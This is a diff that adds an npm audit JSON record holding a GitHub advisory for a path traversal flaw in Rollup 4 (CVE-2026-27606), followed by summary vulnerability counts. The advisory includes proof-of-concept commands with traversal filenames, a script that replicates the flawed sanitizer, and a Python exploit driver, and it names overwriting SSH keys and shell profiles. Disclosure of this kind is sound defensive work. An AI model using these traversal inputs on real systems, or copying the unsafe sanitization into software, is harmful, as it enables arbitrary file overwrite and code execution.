+      "references": "- https://github.com/rollup/rollup/security/advisories/GHSA-mw96-cpmx-2vgc\n- https://nvd.nist.gov/vuln/detail/CVE-2026-27606\n- https://github.com/rollup/rollup/commit/c60770d7aaf750e512c1b2774989ea4596e660b2\n- https://github.com/rollup/rollup/commit/c8cf1f9c48c516285758c1e11f08a54f304fd44e\n- https://github.com/rollup/rollup/commit/d6dee5e99bb82aac0bee1df4ab9efbde455452c3\n- https://github.com/rollup/rollup/releases/tag/v2.80.0\n- https://github.com/rollup/rollup/releases/tag/v3.30.0\n- https://github.com/rollup/rollup/releases/tag/v4.59.0\n- https://github.com/advisories/GHSA-mw96-cpmx-2vgc",
+      "created": "2026-02-25T22:37:26.000Z",
+      "id": 1113515,
+      "npm_advisory_id": null,
+      "overview": "### Summary\nThe Rollup module bundler (specifically v4.x and present in current source) is vulnerable to an Arbitrary File Write via Path Traversal. Insecure file name sanitization in the core engine allows an attacker to control output filenames (e.g., via CLI named inputs, manual chunk aliases, or malicious plugins) and use traversal sequences (`../`) to overwrite files anywhere on the host filesystem that the build process has permissions for. This can lead to persistent Remote Code Execution (RCE) by overwriting critical system or user configuration files.\n\n### Details\nThe vulnerability is caused by the combination of two flawed components in the Rollup core:\n\n1.  **Improper Sanitization**: In `src/utils/sanitizeFileName.ts`, the `INVALID_CHAR_REGEX` used to clean user-provided names for chunks and assets excludes the period (`.`) and forward/backward slashes (`/`, `\\`). \n    ```typescript\n    // src/utils/sanitizeFileName.ts (Line 3)\n    const INVALID_CHAR_REGEX = /[\\u0000-\\u001F\"#$%&*+,:;<=>?[\\]^`{|}\\u007F]/g;\n    ```\n    This allows path traversal sequences like `../../` to pass through the sanitizer unmodified.\n\n2.  **Unsafe Path Resolution**: In `src/rollup/rollup.ts`, the `writeOutputFile` function uses `path.resolve` to combine the output directory with the \"sanitized\" filename.\n    ```typescript\n    // src/rollup/rollup.ts (Line 317)\n    const fileName = resolve(outputOptions.dir || dirname(outputOptions.file!), outputFile.fileName);\n    ```\n    Because `path.resolve` follows the `../` sequences in `outputFile.fileName`, the resulting path points outside of the intended output directory. The subsequent call to `fs.writeFile` completes the arbitrary write.\n\n### PoC\nA demonstration of this vulnerability can be performed using the Rollup CLI or a configuration file.\n\n**Scenario: CLI Named Input Exploit**\n1.  Target a sensitive file location (for demonstration, we will use a file in the project root called `pwned.js`).\n2.  Execute Rollup with a specifically crafted named input where the key contains traversal characters:\n    ```bash\n    rollup --input \"a/../../pwned.js=main.js\" --dir dist\n    ```\n3.  **Result**: Rollup will resolve the output path for the entry chunk as `dist + a/../../pwned.js`, which resolves to the project root. The file `pwned.js` is created/overwritten outside the `dist` folder.\n\n**Reproduction Files provided :**\n*   `vuln_app.js`: Isolated logic exactly replicating the sanitization and resolution bug.\n*   `exploit.py`: Automated script to run the PoC and verify the file escape.\n\nvuln_app.js\n```js\nconst path = require('path');\nconst fs = require('fs');\n\n/**\n * REPLICATED ROLLUP VULNERABILITY\n * \n * 1. Improper Sanitization (from src/utils/sanitizeFileName.ts)\n * 2. Unsafe Path Resolution (from src/rollup/rollup.ts)\n */\n\nfunction sanitize(name) {\n    // The vulnerability: Rollup's regex fails to strip dots and slashes, \n    // allowing path traversal sequences like '../'\n    return name.replace(/[\\u0000-\\u001F\"#$%&*+,:;<=>?[\\]^`{|}\\u007F]/g, '_');\n}\n\nasync function build(userSuppliedName) {\n    const outputDir = path.join(__dirname, 'dist');\n    const fileName = sanitize(userSuppliedName);\n\n    // Vulnerability: path.resolve() follows traversal sequences in the filename\n    const outputPath = path.resolve(outputDir, fileName);\n\n    console.log(`[*] Target write path: ${outputPath}`);\n\n    if (!fs.existsSync(path.dirname(outputPath))) {\n        fs.mkdirSync(path.dirname(outputPath), { recursive: true });\n    }\n\n    fs.writeFileSync(outputPath, 'console.log(\"System Compromised!\");');\n    console.log(`[+] File written successfully.`);\n}\n\nbuild(process.argv[2] || 'bundle.js');\n\n```\n\nexploit.py\n```py\nimport subprocess\nfrom pathlib import Path\n\ndef run_poc():\n    # Target a file outside the 'dist' folder\n    poc_dir = Path(__file__).parent\n    malicious_filename = \"../pwned_by_rollup.js\"\n    target_path = poc_dir / \"pwned_by_rollup.js\"\n\n    print(f\"=== Rollup Path Traversal PoC ===\")\n    print(f\"[*] Malicious Filename: {malicious_filename}\")\n    \n    # Trigger the vulnerable app\n    subprocess.run([\"node\", \"poc/vuln_app.js\", malicious_filename])\n\n    if target_path.exists():\n        print(f\"[SUCCESS] File escaped 'dist' folder!\")\n        print(f\"[SUCCESS] Created: {target_path}\")\n        # target_path.unlink() # Cleanup\n    else:\n        print(\"[FAILED] Exploit did not work.\")\n\nif __name__ == \"__main__\":\n    run_poc()\n```\n\n## POC \n```rollup --input \"bypass/../../../../../../../Users/vaghe/OneDrive/Desktop/pwned_desktop.js=main.js\" --dir dist```\n\n<img width=\"1918\" height=\"1111\" alt=\"image\" src=\"https://github.com/user-attachments/assets/3474eb7c-9c4b-4acd-9103-c70596b490d4\" />\n\n\n\n### Impact\nThis is a **High** level of severity vulnerability.\n*   **Arbitrary File Write**: Attackers can overwrite sensitive files like `~/.ssh/authorized_keys`, `.bashrc`, or system binaries if the build process has sufficient privileges.\n*   **Supply Chain Risk**: Malicious third-party plugins or dependencies can use this to inject malicious code into other parts of a developer's machine during the build phase.\n*   **User Impact**: Developers running builds on untrusted repositories are at risk of system compromise.",
+      "reported_by": null,
+      "title": "Rollup 4 has Arbitrary File Write via Path Traversal",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-27606"
+      ],
+      "access": "public",
+      "severity": "high",
+      "module_name": "rollup",
+      "vulnerable_versions": ">=4.0.0 <4.59.0",
+      "github_advisory_id": "GHSA-mw96-cpmx-2vgc",
+      "recommendation": "Upgrade to version 4.59.0 or later",
+      "patched_versions": ">=4.59.0",
+      "updated": "2026-02-25T22:37:27.000Z",
+      "cvss": {
+        "score": 0,
+        "vectorString": null
+      },
+      "cwe": [
+        "CWE-22"
+      ],
+      "url": "https://github.com/advisories/GHSA-mw96-cpmx-2vgc"
+    }
+  },
+  "muted": [],
+  "metadata": {
+    "vulnerabilities": {
+      "info": 0,
+      "low": 0,
+      "moderate": 3,
+      "high": 8,
+      "critical": 1
+    },
+    "dependencies": 1341,
+    "devDependencies": 0,
+    "optionalDependencies": 0,
+    "totalDependencies": 1341
+  }
+}
